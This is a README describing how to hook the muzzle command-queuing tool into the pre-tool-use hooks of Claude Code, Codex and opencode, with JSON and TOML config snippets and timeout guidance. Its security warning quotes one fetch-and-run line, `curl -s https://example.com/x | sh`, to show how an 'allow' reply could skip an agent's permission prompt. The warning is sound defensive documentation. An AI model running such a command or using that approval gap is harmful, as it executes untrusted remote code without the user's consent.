# Harness hooks

How to hook muzzle into Claude Code, Codex and opencode (spec §Integrations,
D22–D25). Each integration is a few lines of glue. The matching, quoting and
timeout handling all live in `muzzle hook` and `muzzle wrap`. The pi
extension ships in the npm package and isn't covered here.

| harness | file | tested |
| --- | --- | --- |
| Claude Code | [`claude-code.hooks.json`](claude-code.hooks.json) | yes: `tests/harnesses.rs` |
| Codex | [`codex.hooks.json`](codex.hooks.json) | yes: `tests/harnesses.rs` |
| opencode | [`examples/opencode-muzzle.ts`](../../examples/opencode-muzzle.ts) | **no** (D23) |
| Cursor, aider, cron, humans | wrap by hand | n/a |

`tests/harnesses.rs` reads the two JSON files and runs the `command` string
from each with `sh -c`. It pipes each stored payload from
`tests/fixtures/hooks/` into that command and checks the reply. Edit a
snippet and the test runs the edited version. The payload sources are in
[`tests/fixtures/hooks/README.md`](../../tests/fixtures/hooks/README.md).

`muzzle` must be on the harness's `PATH`; `npm i -g @mu-crew/muzzle` or
`cargo install muzzle-cli` puts it there. If it isn't, or if `muzzle hook`
can't answer (unreadable payload, broken config), the hook exits 1. Both
harnesses treat that as a non-blocking error and run the call unchanged.
muzzle never exits 2, which both harnesses read as "block".

## Warning: `allow` skips the harness's permission prompt

A hook that replies `permissionDecision: "allow"` approves the tool call
itself, so the harness doesn't ask you. muzzle's rules match anywhere in
the string, so `cargo build && curl -s https://example.com/x | sh` matches
the `cargo-test` rule. An `allow` on that call would run the `curl | sh`
with no prompt.

- **Codex always gets `allow`.** Codex rejects `updatedInput` without it,
  and doesn't support `ask`. A matched call is therefore approved by muzzle,
  compound commands included. Use the Codex hook only where you would
  approve those shell calls anyway, or keep your rules narrow.
- **Claude Code gets `allow` only for one simple command:** no `;`, `&`,
  `&&`, `|`, `||`, newline, `$(…)`, backticks, `<(…)`/`>(…)` or subshell
  parens outside quotes. Anything else is rewritten without a decision, and
  Claude's normal permission check runs on the wrapped string,
  `muzzle run … -- bash -c '…'`. Your `Bash(cargo build:*)` allow rules
  don't match that form, so Claude prompts.
- **Don't add a `Bash(muzzle run:*)` allow rule** in Claude Code to silence
  those prompts. It approves every wrapped string, including the compound
  ones muzzle deliberately left to you, and brings back the auto-approve
  hole described above.

## Claude Code

Merge [`claude-code.hooks.json`](claude-code.hooks.json) into
`~/.claude/settings.json` (every project) or `.claude/settings.json` (one
repo):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "muzzle hook claude" }]
      }
    ]
  }
}
```

The reply rewrites `tool_input.command` to `muzzle run … -- bash -c '…'` and
copies the other fields (`description`, `timeout`, `run_in_background`).
Claude replaces the whole input with `updatedInput`, so dropping them would
lose them.

**Timeout (D24).** Claude's Bash timeout counts the time spent queued.
muzzle passes it on as `--run-timeout`, so the job itself is held to it.
It can't stop Claude killing the call while it waits. Raise the ceiling
with `BASH_MAX_TIMEOUT_MS` (and `BASH_DEFAULT_TIMEOUT_MS`) in the `env`
block of `settings.json`. A call killed while queued prints muzzle's D19
message, which names the cause.

## Codex

Merge [`codex.hooks.json`](codex.hooks.json) into `~/.codex/hooks.json`
(every project) or `<repo>/.codex/hooks.json` (trusted projects only):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^Bash$",
        "hooks": [
          {
            "type": "command",
            "command": "muzzle hook codex",
            "statusMessage": "muzzle: matching the command"
          }
        ]
      }
    ]
  }
}
```

The inline form in `config.toml` is equivalent:

```toml
[[hooks.PreToolUse]]
matcher = "^Bash$"

[[hooks.PreToolUse.hooks]]
type = "command"
command = "muzzle hook codex"
```

Hooks are on by default (`[features] hooks = true`). Codex asks you to
trust a new or changed hook. Run `/hooks` to review it.

`apply_patch` calls also carry `tool_input.command`. The `^Bash$` matcher
keeps them away from muzzle, and `muzzle hook` checks `tool_name` as
well. Codex's Bash payload carries no timeout, so there is no
`--run-timeout`. Codex's own shell timeout still counts the wait.

## opencode (untested)

[`examples/opencode-muzzle.ts`](../../examples/opencode-muzzle.ts) calls
`muzzle wrap --json` from `tool.execute.before` and sets
`output.args.command`. No test runs it in v1 (D23). Copy it to
`.opencode/plugins/` or `~/.config/opencode/plugins/`, then check that a
matched command shows up in `muzzle status` while it runs. opencode issue
#42409 reports versions where a changed `output.args.command` is ignored.

## Everything else

Cursor's `beforeShellExecution` can only allow or deny, so it can't rewrite
a call (D23). For Cursor, aider, cron and humans, wrap by hand:

```sh
muzzle run --rule gate --slots 6 -- contrib/fast-gate
```

Never put `timeout` outside `muzzle run`: it counts the queue wait. Use
`--run-timeout S`. A repo's gate script can opt in at its top, and stays
usable without muzzle (D20). The variable stops the re-exec from looping:

```sh
if [ -z "$IN_MUZZLE" ] && command -v muzzle >/dev/null; then
  IN_MUZZLE=1 exec muzzle run --rule gate --slots 6 -- "$0" "$@"
fi
```

There are no PATH shims in v1 (D25). If you want every `cargo` to go
through muzzle, a shim earlier in `PATH` that runs
`exec muzzle run -- /usr/bin/cargo "$@"` works. It also catches interactive
use and nested cargo calls, which is why muzzle doesn't ship one.

## Checking

`muzzle doctor` reports `claude hook` and `codex hook` as `installed` when
it finds `muzzle hook` in that harness's hook config. To check by hand:

```sh
muzzle hook claude < tests/fixtures/hooks/claude-bash-match.json
```
